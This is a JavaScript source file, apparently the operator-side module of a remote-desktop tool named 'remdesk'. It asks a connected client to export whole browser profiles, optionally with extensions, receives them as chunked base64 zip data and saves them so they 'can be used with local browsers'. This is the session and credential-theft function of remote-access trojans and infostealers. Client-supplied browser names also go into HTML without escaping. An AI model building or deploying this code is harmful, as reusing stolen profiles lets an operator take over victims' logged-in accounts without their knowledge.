/**
 * Browser Profile Manager Module for Operator
 * 
 * Handles downloading browser profiles from client and
 * using them to launch browsers locally.
 */
(() => {
  "use strict";

  const remdesk = window.remdesk || (window.remdesk = {});
  const { state } = remdesk;

  // Profile state
  const profileState = {
    availableBrowsers: [],
    downloadedProfiles: {},
    pendingExport: null,
    profileChunks: [],
  };

  // DOM Elements
  let profileDialog = null;
  let profileList = null;
  let profileStatus = null;

  /**
   * Send profile action to client
   */
  function sendProfileAction(action, payload = {}) {
    if (!state.dataChannel || state.dataChannel.readyState !== "open") {
      setProfileStatus("Not connected to client", "error");
      return false;
    }

    const message = {
      action: `profile_${action}`,
      ...payload
    };

    try {
      if (remdesk.sendEncrypted) {
        remdesk.sendEncrypted(message);
      } else {
        state.dataChannel.send(JSON.stringify(message));
      }
      return true;
    } catch (err) {
      console.error("Failed to send profile action:", err);
      setProfileStatus(`Failed: ${err}`, "error");
      return false;
    }
  }

  /**
   * Request list of available browsers from client
   */
  function listBrowsers() {
    setProfileStatus("Fetching browser list...", "");
    sendProfileAction("list");
  }

  /**
   * Request profile export from client
   */
  function exportProfile(browser, includeExtensions = false) {
    setProfileStatus(`Downloading ${browser} profile...`, "");
    profileState.pendingExport = browser;
    profileState.profileChunks = [];
    sendProfileAction("export", { 
      browser: browser,
      include_extensions: includeExtensions 
    });
  }

  /**
   * Handle profile response from client
   */
  function handleProfileResponse(payload) {
    const action = payload.action || "";

    switch (action) {
      case "profile_list":
        if (payload.success) {
          profileState.availableBrowsers = payload.browsers || [];
          updateBrowserList();
          setProfileStatus(`Found ${payload.browsers.length} browsers`, "ok");
        } else {
          setProfileStatus(`Error: ${payload.error}`, "error");
        }
        break;

      case "profile_export":
        if (payload.success) {
          // Metadata received, waiting for data chunks
          setProfileStatus(
            `Exporting ${payload.browser_name}: ${payload.files_count} files (${formatSize(payload.size)})...`,
            ""
          );
        } else {
          setProfileStatus(`Export failed: ${payload.error}`, "error");
          profileState.pendingExport = null;
        }
        break;

      default:
        // Check if it's a profile data message (chunked transfer)
        if (payload.action === "profile" || payload.kind === "profile") {
          handleProfileChunk(payload);
        } else if (action.startsWith("profile_")) {
          console.log("Unknown profile response:", payload);
        }
    }
  }

  /**
   * Handle chunked profile data
   */
  function handleProfileChunk(payload) {
    if (typeof payload === "string") {
      // Complete data in single message
      saveProfile(profileState.pendingExport, payload);
    } else if (payload.chunk !== undefined) {
      // Chunked transfer
      profileState.profileChunks.push(payload.chunk);
      if (payload.final) {
        const fullData = profileState.profileChunks.join("");
        saveProfile(profileState.pendingExport, fullData);
        profileState.profileChunks = [];
      }
    } else if (payload.data) {
      // Data in payload
      saveProfile(profileState.pendingExport, payload.data);
    }
  }

  /**
   * Save downloaded profile
   */
  function saveProfile(browser, base64Data) {
    if (!browser) {
      setProfileStatus("No pending profile export", "error");
      return;
    }

    try {
      // Decode and save
      const binaryString = atob(base64Data);
      const bytes = new Uint8Array(binaryString.length);
      for (let i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
      }
      const blob = new Blob([bytes], { type: "application/zip" });
      
      // Store reference
      profileState.downloadedProfiles[browser] = {
        blob: blob,
        downloadedAt: Date.now(),
        size: blob.size,
      };

      // Offer to save file
      const filename = `${browser}_profile_${Date.now()}.zip`;
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);

      setProfileStatus(`Profile saved: ${filename} (${formatSize(blob.size)})`, "ok");
      updateBrowserList();

    } catch (err) {
      console.error("Failed to save profile:", err);
      setProfileStatus(`Save failed: ${err}`, "error");
    }

    profileState.pendingExport = null;
  }

  /**
   * Format file size
   */
  function formatSize(bytes) {
    if (bytes < 1024) return bytes + " B";
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + " KB";
    return (bytes / (1024 * 1024)).toFixed(1) + " MB";
  }

  /**
   * Update browser list UI
   */
  function updateBrowserList() {
    if (!profileList) return;

    if (profileState.availableBrowsers.length === 0) {
      profileList.innerHTML = '<div class="profile-empty">No browsers found. Click "Refresh" to scan.</div>';
      return;
    }

    let html = '';
    for (const browser of profileState.availableBrowsers) {
      const downloaded = profileState.downloadedProfiles[browser.id];
      const downloadedInfo = downloaded 
        ? `<span class="profile-downloaded">✓ Downloaded (${formatSize(downloaded.size)})</span>`
        : '';
      
      html += `
        <div class="profile-item" data-browser="${browser.id}">
          <div class="profile-info">
            <span class="profile-name">${browser.name}</span>
            <span class="profile-type">${browser.type}</span>
            ${downloadedInfo}
          </div>
          <div class="profile-actions">
            <button class="profile-btn download-btn" onclick="remdesk.profiles.export('${browser.id}')" title="Download profile">
              ⬇️ Download
            </button>
          </div>
        </div>
      `;
    }
    profileList.innerHTML = html;
  }

  /**
   * Set profile status
   */
  function setProfileStatus(message, statusType) {
    if (!profileStatus) return;
    profileStatus.textContent = message;
    profileStatus.className = `profile-status ${statusType || ''}`;
  }

  /**
   * Create profile manager dialog
   */
  function createProfileDialog() {
    if (profileDialog) {
      profileDialog.style.display = "flex";
      listBrowsers();
      return;
    }

    profileDialog = document.createElement("div");
    profileDialog.id = "profileManager";
    profileDialog.className = "profile-dialog";
    profileDialog.innerHTML = `
      <div class="profile-dialog-content">
        <div class="profile-header">
          <span class="profile-title">Browser Profiles</span>
          <button class="profile-close" onclick="remdesk.profiles.close()">×</button>
        </div>
        <div class="profile-toolbar">
          <button class="profile-btn" onclick="remdesk.profiles.refresh()">🔄 Refresh</button>
          <span id="profileStatus" class="profile-status"></span>
        </div>
        <div class="profile-list" id="profileList">
          <div class="profile-empty">Click "Refresh" to scan for browsers</div>
        </div>
        <div class="profile-footer">
          <p>Downloaded profiles can be used with local browsers</p>
        </div>
      </div>
    `;

    // Add styles
    const style = document.createElement("style");
    style.textContent = `
      .profile-dialog {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0,0,0,0.7);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 10001;
      }
      .profile-dialog-content {
        background: #1e1e1e;
        border: 1px solid #333;
        border-radius: 8px;
        width: 500px;
        max-height: 80vh;
        display: flex;
        flex-direction: column;
        box-shadow: 0 4px 20px rgba(0,0,0,0.5);
      }
      .profile-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 12px 16px;
        background: #2d2d2d;
        border-bottom: 1px solid #333;
        border-radius: 8px 8px 0 0;
      }
      .profile-title {
        font-weight: bold;
        color: #fff;
      }
      .profile-close {
        background: none;
        border: none;
        color: #f55;
        font-size: 20px;
        cursor: pointer;
        padding: 0 4px;
      }
      .profile-close:hover {
        color: #ff8888;
      }
      .profile-toolbar {
        display: flex;
        align-items: center;
        gap: 12px;
        padding: 12px 16px;
        border-bottom: 1px solid #333;
      }
      .profile-btn {
        background: #333;
        color: #fff;
        border: none;
        padding: 6px 12px;
        border-radius: 4px;
        cursor: pointer;
        font-size: 13px;
      }
      .profile-btn:hover {
        background: #444;
      }
      .profile-status {
        color: #888;
        font-size: 12px;
      }
      .profile-status.ok { color: #0f0; }
      .profile-status.error { color: #f55; }
      .profile-list {
        flex: 1;
        overflow-y: auto;
        padding: 8px;
      }
      .profile-empty {
        text-align: center;
        color: #666;
        padding: 20px;
      }
      .profile-item {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 10px 12px;
        background: #2a2a2a;
        border-radius: 6px;
        margin-bottom: 8px;
      }
      .profile-item:hover {
        background: #333;
      }
      .profile-info {
        display: flex;
        flex-direction: column;
        gap: 4px;
      }
      .profile-name {
        color: #fff;
        font-weight: 500;
      }
      .profile-type {
        color: #888;
        font-size: 11px;
        text-transform: uppercase;
      }
      .profile-downloaded {
        color: #0f0;
        font-size: 11px;
      }
      .profile-actions {
        display: flex;
        gap: 8px;
      }
      .download-btn {
        background: #0066cc;
      }
      .download-btn:hover {
        background: #0077ee;
      }
      .profile-footer {
        padding: 12px 16px;
        border-top: 1px solid #333;
        text-align: center;
      }
      .profile-footer p {
        color: #666;
        font-size: 12px;
        margin: 0;
      }
    `;
    document.head.appendChild(style);
    document.body.appendChild(profileDialog);

    // Get references
    profileList = document.getElementById("profileList");
    profileStatus = document.getElementById("profileStatus");

    // Initial refresh
    listBrowsers();
  }

  /**
   * Close profile dialog
   */
  function closeProfileDialog() {
    if (profileDialog) {
      profileDialog.style.display = "none";
    }
  }

  /**
   * Toggle profile dialog
   */
  function toggleProfileDialog() {
    if (!profileDialog) {
      createProfileDialog();
    } else if (profileDialog.style.display === "none") {
      profileDialog.style.display = "flex";
      listBrowsers();
    } else {
      profileDialog.style.display = "none";
    }
  }

  /**
   * Initialize profile module
   */
  function initProfiles() {
    // Add button handler
    const profileBtn = document.getElementById("openProfilesBtn");
    if (profileBtn) {
      profileBtn.addEventListener("click", toggleProfileDialog);
    }

    console.log("Browser Profiles module initialized");
  }

  // Export
  remdesk.profiles = {
    state: profileState,
    open: createProfileDialog,
    close: closeProfileDialog,
    toggle: toggleProfileDialog,
    refresh: listBrowsers,
    export: exportProfile,
    handleResponse: handleProfileResponse,
    init: initProfiles,
  };

  // Auto-init
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", initProfiles);
  } else {
    initProfiles();
  }
})();
